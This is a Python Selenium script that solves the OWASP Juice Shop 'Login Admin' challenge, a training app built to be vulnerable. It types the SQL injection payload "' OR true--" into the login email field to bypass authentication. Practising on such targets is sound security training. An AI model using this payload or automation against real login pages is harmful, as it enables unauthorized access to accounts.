# This file will allow us to exploit the login functionality of the OWASP Juice Shop
# using SQLi to log into the admin account.

# Completes the achievement "Injection - Login Admin"

# Import libraries
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# This will test the vulnerability of the login page on the OWASP Juice Shop.
def test_sqli(driver, base_url, sleep):
    try:
        driver.get(f"{base_url}/#/login")
        time.sleep(2)
        
        # Set up the exploit:
        email_field = driver.find_element(By.ID, "email")
        password_field = driver.find_element(By.ID, "password")
        email_payload = "' OR true--"
        password_payload = "Literally Anything"

        email_field.clear()
        email_field.send_keys(email_payload)
        password_field.clear()
        password_field.send_keys(password_payload)
        time.sleep(sleep)
        login = driver.find_element(By.ID, "loginButton")
        login.click()

        # Wait and see if the exploit worked (a redirect to dashboard)
        wait = WebDriverWait(driver, 10)
        try:
            wait.until(EC.url_contains("/#/search"))
            time.sleep(sleep)
            return True
        except:
            return False
    except Exception as e:
        print(f"An exception occured: {e}")
        return False